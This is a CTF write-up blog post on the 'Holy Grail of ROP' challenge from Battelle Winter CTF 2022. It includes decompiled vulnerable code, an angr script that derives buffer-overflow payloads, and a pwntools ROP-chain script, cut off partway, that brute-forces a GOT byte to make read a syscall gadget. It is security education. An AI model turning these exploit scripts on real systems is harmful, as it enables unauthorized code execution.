<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer-when-downgrade">

    <title>Battelle Winter CTF 2022</title>
    <meta name="description" content="">

    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
    
    

    <style>
        
        [data-theme="Dark"] {   
            --background-color: #2D283E;
            --background-alt-color: #36304B;
            --highlight-color: #DEC1FF;
            --highlight-color-alt: #ED254E;
            --foreground-color: #D1D7E0;
        }
        
        [data-theme="Light"] {   
            --background-color: #E0F5CC;
            --background-alt-color: #EAF8DD;
            --highlight-color: #D8315B;
            --highlight-color-alt: #0197F6;
            --foreground-color: #3B413C;
        }
        
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
    
    
</head>
<body data-theme="dark">
    <script defer>

        function setTheme(theme) {
            document.body.dataset['theme'] = theme;
            localStorage.setItem('theme', theme);
        }
        window.addEventListener('storage', function(event){
            if (event.storageArea === localStorage && event.key === "theme") {
                setTheme(event.newValue);
            }
        }, false);
        setTheme(localStorage.getItem('theme') || 'dark');
        setTimeout(() => window.document.body.classList.add("transition"), 300);
    </script>
    <a class="skip-main" href="#main">Skip to content</a>
    <div class="container">
        <header> 
            <h1 class="site-header">
                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
            </h1>
            <nav>
                
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
                
<!--                 <div class="search-container">
                    <input id="search" type="search" placeholder="üßê Search!">

                    <div class="search-results">
                        <div class="search-results__items"></div>
                    </div>
                </div> -->
                
            </nav>
        </header>
        <main id="main" tabindex="-1">
            


<nav class="toc">
  <ul>
  
      <li>
        <a href="https://tsheinen.github.io/battelle-winter-2022/#holy-grail-of-rop">Holy Grail of ROP</a>
        <ul>
          
            <li>
                <a href="https://tsheinen.github.io/battelle-winter-2022/#recon">recon</a>
            </li>
          
            <li>
                <a href="https://tsheinen.github.io/battelle-winter-2022/#automatic-exploitation">automatic exploitation</a>
            </li>
          
            <li>
                <a href="https://tsheinen.github.io/battelle-winter-2022/#read-syscall">read -&gt; syscall</a>
            </li>
          
            <li>
                <a href="https://tsheinen.github.io/battelle-winter-2022/#getting-a-shell">getting a shell!</a>
            </li>
          
            <li>
                <a href="https://tsheinen.github.io/battelle-winter-2022/#tying-it-all-together">tying it all together</a>
            </li>
          
        </ul>
      </li>
  
  </ul>
  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
  </svg>
</nav>

<article class="post">
    <header>
        <h1>Battelle Winter CTF 2022</h1>
    </header>

    <div class="content">
        <h1 id="holy-grail-of-rop"><a href="/battelle-winter-2022/holy-grail-of-rop">Holy Grail of ROP</a></h1>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>A M√∏√∏se once bit my sister... No realli! She was Karving her initials on the m√∏√∏se with the sharpened end of an interspace t√∏√∏thbrush given her by Svenge - her brother-in-law - an Oslo dentist and star of many Norwegian m√∏vies &quot;The H√∏t Hands of an Oslo Dentist&quot;, &quot;Fillings of Passion&quot;, &quot;The Huge M√∏lars of Horst Nordfink&quot;...
</span><span>
</span><span>nc ctf.battelle.org 30042 
</span><span>
</span><span>Hint: To pwn a binary find the function ‚Äúholy_grail‚Äù and call it
</span></code></pre>
<h2 id="recon">recon</h2>
<p>Unlike many pwn challenges, this had no binary to be downloaded. The reason why quickly became clear when we connected to the provided service and it dropped an ELF binary.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>‚ùØ  nc ctf.battelle.org 30042
</span><span>To get to the holy grail you must answer three questions...
</span><span>Or... The same question 3 times.
</span><span>WHAT?
</span><span>Monty Python and The Holy Grail quote am I thinking of?
</span><span>Oh yea and you have to find 3 holy grails... Wait was it 3 or 5?********************************
</span><span>EL4!4 hDDPQ/lib/ld-linux.so.2GNUGNYM…•	 	K0` &quot;D&lt;)5
</span><span>V                                                        libc.so.6_IO_stdin_usedstrncmpstrlenmemsetreadstdoutsetvbuf__libc_start_mainGLIBC_2.0__gmon_start__ii
</span><span>...
</span><span> $$ h 0h ) 
</span><span>********************************
</span><span>SHE&#39;S A WITCH BURN HER!
</span></code></pre>
<p>The binary wasn't in a format which could easily be made into a file first thing I did was construct a brief script to connect and write the binary to a file for further analysis.</p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>time
</span><span>
</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;kitty&#39;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
</span><span>
</span><span>r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.battelle.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30042</span><span>)
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************&quot;</span><span>)
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
</span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary1&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>	f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>))
</span></code></pre>
<p>The main function is pretty minimal; only calling two functions.</p>
<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">FUN_08048516</span><span>(</span><span style="color:#ffa759;">void</span><span>) {
</span><span>  </span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span>}
</span></code></pre>
<p>The first disables buffering on stdout, common in CTF challenges over a TCP socket like this because buffering can make exploits behave strangely.</p>
<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">FUN_08048579</span><span>(</span><span style="color:#ffa759;">void</span><span>) {
</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t</span><span> __n</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">char</span><span> local_31 [</span><span style="color:#ffcc66;">33</span><span>]</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>local_10</span><span style="color:#ccc9c2cc;">;
</span><span>  
</span><span>  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;A SHRUBBERRY!!!!&quot;</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#f28779;">memset</span><span>(local_31</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>local_31</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1d</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  __n </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(PTR_s_We_have_no_shrubberies_here</span><span style="color:#f29e74;">!</span><span>_0804b02c)</span><span style="color:#ccc9c2cc;">;
</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strncmp</span><span>(PTR_s_We_have_no_shrubberies_here</span><span style="color:#f29e74;">!</span><span>_0804b02c</span><span style="color:#ccc9c2cc;">,</span><span>local_31</span><span style="color:#ccc9c2cc;">,</span><span>__n)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
</span><span>    </span><span style="color:#ffd580;">FUN_080485fb</span><span>()</span><span style="color:#ccc9c2cc;">;
</span><span>  }
</span><span>  </span><span style="color:#ffa759;">else </span><span>{
</span><span>    </span><span style="color:#ffd580;">FUN_0804867d</span><span>()</span><span style="color:#ccc9c2cc;">;
</span><span>  }
</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span>}
</span></code></pre>
<p>The second reads from stdin, compares it to a static string, and then branches based on the equality. Each branch calls another function which does essentially the same thing, forming a tree of functions, and then finally there are "leaf" functions which do not call other functions at all.</p>
<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">FUN_08048ad7</span><span>(</span><span style="color:#ffa759;">void</span><span>) {
</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t</span><span> __n</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">char</span><span> local_18 [</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>local_10</span><span style="color:#ccc9c2cc;">;
</span><span>  
</span><span>  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Your Mother was a Hamster, and your Father smelt of Elderberries!&quot;</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#f28779;">memset</span><span>(local_18</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>local_18</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0xe0</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  __n </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(PTR_DAT_0804b058)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#f28779;">strncmp</span><span>(PTR_DAT_0804b058</span><span style="color:#ccc9c2cc;">,</span><span>local_18</span><span style="color:#ccc9c2cc;">,</span><span>__n)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span>}
</span></code></pre>
<p>While looking through the stripped functions I saw a buffer overflow in one of the leaf functions. At this point the rough shape of the challenge is becoming clear. Subsequent connections to the service provide binaries which follow the same archetype but are subtly different -- strings, buffer sizes, etc differ. We need to write code to generate an exploit in a generic enough manner that it will work for any binary the server provides.</p>
<h2 id="automatic-exploitation">automatic exploitation</h2>
<p>I used angr to generate exploiting payloads for these binaries. I would love to have created this myself, but I was able to pretty much wholesale snag a script from <a href="https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows">a blog post on discovering buffer overflows with angr</a></p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>angr</span><span style="color:#ccc9c2cc;">, </span><span>argparse
</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span>
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
</span><span>    parser </span><span style="color:#f29e74;">= </span><span>argparse</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ArgumentParser</span><span>()
</span><span>
</span><span>    parser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_argument</span><span>(</span><span style="color:#bae67e;">&quot;Binary&quot;</span><span>)
</span><span>
</span><span>    args </span><span style="color:#f29e74;">= </span><span>parser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">parse_args</span><span>()
</span><span>
</span><span>    TARGET </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;DCBA&quot;
</span><span>
</span><span>    p </span><span style="color:#f29e74;">= </span><span>angr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Project</span><span>(args</span><span style="color:#f29e74;">.</span><span>Binary)
</span><span>    state </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blank_state</span><span>()
</span><span>    
</span><span>    simgr </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">simgr</span><span>(state</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">save_unconstrained</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
</span><span>    simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]  </span><span style="color:#f29e74;">= </span><span>[]
</span><span>    
</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">check_mem_corruption</span><span>(</span><span style="color:#ffcc66;">simgr</span><span>):
</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>unconstrained):
</span><span>            </span><span style="color:#ffa759;">for </span><span>path </span><span style="color:#ffa759;">in </span><span>simgr</span><span style="color:#f29e74;">.</span><span>unconstrained:
</span><span>                </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>(</span><span style="color:#ffcc66;">extra_constraints</span><span style="color:#f29e74;">=</span><span>[path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span>TARGET]):
</span><span>                    path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span>TARGET)
</span><span>                    </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>():
</span><span>                        simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(path)
</span><span>                    simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;unconstrained&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">remove</span><span>(path)
</span><span>                    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">drop</span><span>(</span><span style="color:#ffcc66;">stash</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;active&#39;</span><span>)
</span><span>        </span><span style="color:#ffa759;">return </span><span>simgr
</span><span>
</span><span>    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">explore</span><span>(</span><span style="color:#ffcc66;">step_func</span><span style="color:#f29e74;">=</span><span>check_mem_corruption)
</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>:
</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;could not derive corrupting payload :(&quot;</span><span>)
</span><span>        </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    </span><span style="color:#ffa759;">else</span><span>:
</span><span>        dump </span><span style="color:#f29e74;">= </span><span>simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>][</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">.</span><span>posix</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span>        f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(dump[</span><span style="color:#ccc9c2cc;">:</span><span>dump</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">index</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;ABCD&quot;</span><span>)</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>])
</span><span>            
</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
</span><span>    </span><span style="color:#ffd580;">main</span><span>()
</span></code></pre>
<p>This script took a binary as an argument, attempted to derive a corrupting payload, and then wrote it to a file for my usage elsewhere.</p>
<h2 id="read-syscall">read -&gt; syscall</h2>
<p>So, we have a decent (but variable) sized buffer overflow. Where do we go from here?</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>[*] &#39;/home/sky/battelle-ctf-2021/holy_grail_rop/binary1&#39;
</span><span>    Arch:     i386-32-little
</span><span>    RELRO:    Partial RELRO
</span><span>    Stack:    No canary found
</span><span>    NX:       NX enabled
</span><span>    PIE:      No PIE (0x8048000)
</span></code></pre>
<p>Mitigations are pretty light -- NX is enabled but it lacks a canary and PIE is disabled. Usually in this scenario I would reach for ret2libc, but ASLR makes that troublesome in this situation because we have no easy method of leaking a libc pointer. On the bright side, no PIE means we can easily pivot the stack into BSS.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>‚ùØ nm --dynamic ./binary1
</span><span>         w __gmon_start__
</span><span>08048d3c R _IO_stdin_used
</span><span>         U __libc_start_main@GLIBC_2.0
</span><span>         U memset@GLIBC_2.0
</span><span>         U read@GLIBC_2.0
</span><span>         U setvbuf@GLIBC_2.0
</span><span>         U stdout@GLIBC_2.0
</span><span>         U strlen@GLIBC_2.0
</span><span>         U strncmp@GLIBC_2.0
</span></code></pre>
<p>We have access to a pretty slim set of libc functions, none of which write to stdout. Interestingly enough there is an stdout symbol, from buffering being disabled, but I do not believe that to be exploitable.</p>
<p>I was stuck at this point for ages trying to think up a viable exploit method when I noticed something interesting about the disassembly of read.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>gef‚û§  disas read
</span><span>Dump of assembler code for function read:
</span><span>   0xf7e8b850 &lt;+0&gt;:	endbr32 
</span><span>   0xf7e8b854 &lt;+4&gt;:	push   edi
</span><span>   0xf7e8b855 &lt;+5&gt;:	push   esi
</span><span>   0xf7e8b856 &lt;+6&gt;:	call   0xf7edff15 &lt;__x86.get_pc_thunk.si&gt;
</span><span>   0xf7e8b85b &lt;+11&gt;:	add    esi,0xfa5c1
</span><span>   0xf7e8b861 &lt;+17&gt;:	push   ebx
</span><span>   0xf7e8b862 &lt;+18&gt;:	sub    esp,0x10
</span><span>   0xf7e8b865 &lt;+21&gt;:	mov    eax,gs:0xc
</span><span>   0xf7e8b86b &lt;+27&gt;:	test   eax,eax
</span><span>   0xf7e8b86d &lt;+29&gt;:	jne    0xf7e8b898 &lt;read+72&gt;
</span><span>   0xf7e8b86f &lt;+31&gt;:	mov    ebx,DWORD PTR [esp+0x20]
</span><span>   0xf7e8b873 &lt;+35&gt;:	mov    ecx,DWORD PTR [esp+0x24]
</span><span>   0xf7e8b877 &lt;+39&gt;:	mov    eax,0x3
</span><span>   0xf7e8b87c &lt;+44&gt;:	mov    edx,DWORD PTR [esp+0x28]
</span><span>   0xf7e8b880 &lt;+48&gt;:	call   DWORD PTR gs:0x10
</span><span>   ...
</span></code></pre>
<p>At read+48 there is an <a href="https://stackoverflow.com/questions/41690592/what-does-gs0x10-do-in-assembler">instruction which performs a syscall</a> and more importantly this is quite close to the beginning of the function so there is a pretty decent chance the difference between read+0 and read+48 is <em>only the last byte</em>. This is vitally important because ASLR does not randomize the lowest 12 bytes which means the value of this byte on the server is constant. If we can figure out what this byte is on the server, we can transmute read into a syscall gadget which can be leveraged for information leakage.</p>
<p>As it turns out, constructing a ROP chain which can utilize a syscall gadget to leak information in this binary is nontrivial. My original plan was to use sigreturn to set the argument registers, but that turned out to not work because it clobbered the segment registers (genuinely unsure why because I don't think it should; let me know if you're reading this and you know why). I managed to make a rop chain capable of leaking a single byte by leveraging leftover register values from read, an INC ECX gadget, and a "mov al, 4; or byte ptr [ecx], al; leave; ret" gadget (I later improved on this rop chain to be able to leak larger ranges, but this worked to brute force this byte).</p>
<p>I wrote up a quick script to brute force overwrite the last byte and apply this ROP chain. The theory was that if the overwrite was correct, read would become a syscall gadget and I would see an extra byte in the response.</p>
<p>(this was pretty much my earliest functional script; see later ones if you want comments :) )</p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>time
</span><span>
</span><span>bss </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0804b068
</span><span style="color:#ffa759;">import </span><span>multiprocessing
</span><span>semaphore </span><span style="color:#f29e74;">= </span><span>multiprocessing</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Semaphore</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>file_semaphore </span><span style="color:#f29e74;">= </span><span>multiprocessing</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Semaphore</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">try_byte</span><span>(</span><span style="color:#ffcc66;">syscall_gadget_no</span><span>):
</span><span>    </span><span style="color:#ffa759;">try</span><span>:
</span><span>        syscall_gadget </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p8</span><span>(syscall_gadget_no)
</span><span>        </span><span style="color:#ffa759;">with </span><span>semaphore:
</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;trying </span><span>{syscall_gadget_no}</span><span style="color:#bae67e;"> - </span><span>{syscall_gadget}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>
</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.battelle.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30042</span><span>)
</span><span>
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************&quot;</span><span>)
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
</span><span>        </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary1&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>            f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************&quot;</span><span>))
</span><span>
</span><span>        </span><span style="color:#ffd580;">process</span><span>([</span><span style="color:#bae67e;">&quot;python&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;detect_vuln2.py&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;binary1&quot;</span><span>])</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()
</span><span>
</span><span>        exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./binary1&quot;</span><span>)
</span><span>        POP_EBX_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x08048371
</span><span>        INC_ECX_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x41\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>
</span><span>        pivot_payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
</span><span>
</span><span>        pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(bss </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/bash&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>        as_for_strlen_start </span><span style="color:#f29e74;">= </span><span>bss </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload)
</span><span>        pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(bss </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot;</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffcc66;">150</span><span>)
</span><span>
</span><span>        pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(</span><span style="color:#ffcc66;">0x0804b14a</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>)
</span><span>
</span><span>        chain_start </span><span style="color:#f29e74;">= </span><span>bss </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload)
</span><span>
</span><span>        pivot_chain </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>)
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(pivot_chain</span><span style="color:#f29e74;">.</span><span>ebx[</span><span style="color:#ffcc66;">0</span><span>])
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>        </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>            pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">0x080484f7</span><span>) </span><span style="font-style:italic;color:#5c6773;"># mov ax, 4 gadget
</span><span>        </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>            pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
